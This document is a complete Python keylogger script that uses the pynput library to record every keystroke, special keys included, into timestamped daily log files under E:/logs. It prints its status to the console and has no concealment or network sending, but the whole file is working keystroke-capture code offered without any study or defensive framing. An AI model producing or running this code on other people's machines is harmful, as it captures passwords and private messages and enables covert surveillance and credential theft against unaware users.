from pynput import keyboard
import os
from datetime import datetime

# Create logs directory if it doesn't exist
os.makedirs("E:/logs", exist_ok=True)

def get_current_log_file():
    """Get the current day's log file name"""
    current_date = datetime.now().strftime("%Y%m%d")
    return f"E:/logs/keylog_{current_date}.txt"

def write_to_log(text, new_line=False):
    try:
        with open(get_current_log_file(), "a", encoding="utf-8") as f:
            if new_line:
                timestamp = datetime.now().strftime("%H:%M:%S")
                f.write(f"\n[{timestamp}] ")
            else:
                f.write(text)
    except Exception as e:
        print(f"Error writing to log: {e}")

def on_press(key):
    try:
        # Handle Enter key
        if key == keyboard.Key.enter:
            write_to_log("", new_line=True)
            return
            
        # Handle Space key
        if key == keyboard.Key.space:
            write_to_log(" ")
            return

        # Handle regular keys
        if hasattr(key, 'char'):
            write_to_log(key.char)
        else:
            # Handle other special keys
            special_key = str(key).replace("Key.", "<") + ">"
            write_to_log(special_key)
            
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    print("Keylogger started...")
    print("Logs are being saved to:", get_current_log_file())
    print("Press Ctrl+C to stop")
    
    # Add initial timestamp
    write_to_log("", new_line=True)
    
    # Start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped")

if __name__ == "__main__":
    main()